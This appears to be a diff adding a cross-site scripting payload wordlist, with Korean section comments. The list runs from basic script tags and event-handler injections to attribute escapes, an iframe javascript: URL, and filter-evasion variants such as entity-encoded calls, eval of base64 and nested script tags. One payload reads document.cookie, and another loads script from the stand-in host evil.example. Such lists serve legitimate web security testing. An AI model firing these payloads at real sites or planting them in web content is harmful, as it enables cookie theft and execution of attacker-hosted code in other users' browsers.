@@ -1,0 +1,21 @@
+# XSS - 반사(reflection) 확인 가능한 패턴 위주 (간단 -> 복잡)
+# --- 기본 스크립트 삽입 ---
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+# --- 이벤트 핸들러 기반 ---
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+# --- 속성/링크 탈출 ---
+"><img src=x onerror=alert(document.cookie)>
+'><svg/onload=alert(1)>
+# --- 프레임/외부 로드 ---
+<iframe src=javascript:alert(1)>
+<script src=//evil.example/x.js></script>
+# --- 난독화/우회 ---
+<svg><script>alert&#40;1&#41;</script>
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+<scr<script>ipt>alert(1)</scr</script>ipt>
